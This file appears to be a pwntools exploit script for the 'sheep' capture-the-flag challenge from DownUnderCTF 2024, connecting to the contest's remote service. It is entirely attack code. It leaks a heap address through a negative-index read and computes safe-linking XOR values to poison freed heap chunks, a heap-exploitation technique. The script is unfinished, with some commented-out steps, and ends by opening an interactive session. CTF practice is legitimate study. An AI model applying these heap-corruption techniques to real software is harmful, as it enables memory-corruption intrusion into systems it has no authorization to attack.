#!/usr/bin/python3

from pwn import *

exe = ELF('sheep_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('2024.ductf.dev', 30025)
else:
    p = process(exe.path)


def buy(type):
    global p
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(type).encode())


def upgrade(idx, type):
    global p
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx).encode())
    p.sendlineafter(b"> ", str(type).encode())


def sell(idx):
    global p
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", str(idx).encode())


def view(idx):
    global p
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"> ", str(idx).encode())


buy(0)
sell(0)
view(-69)
p.recvuntil(b'WPS: ')
heap = int(p.recvline(keepends=False)) << 12
info("heap: " + hex(heap))
for i in range(10):
    buy(0)
sell(1)
sell(4)
target = 0x020+heap
chunk_4 = 0x3d0+heap
res = target ^ (chunk_4 >> 12)
view(-69)
p.recvuntil(b'WPS: ')
val_chunk4 = int(p.recvline(keepends=False))
info("value 4: " + hex(val_chunk4))
info("res: " + hex(res))
for i in range(10):
    view(-69)
if res > val_chunk4:
    for i in range(res-val_chunk4):
        upgrade(-69,1)
else:
    p.close()
GDB()
buy(0)
buy(1)
sell(2)
sell(3)
target = 0x3b0+heap
chunk_4 = 0x3d0+heap
res = target ^ (chunk_4 >> 12)
if res > val_chunk4:
    for i in range(res-val_chunk4):
        upgrade(-69,1)
buy(0)
# buy(1)
# for i in range(6):
# for i in range(3,20):
    # buy(0)
# sell(1)

# sell(0)
# buy(0)

p.interactive()
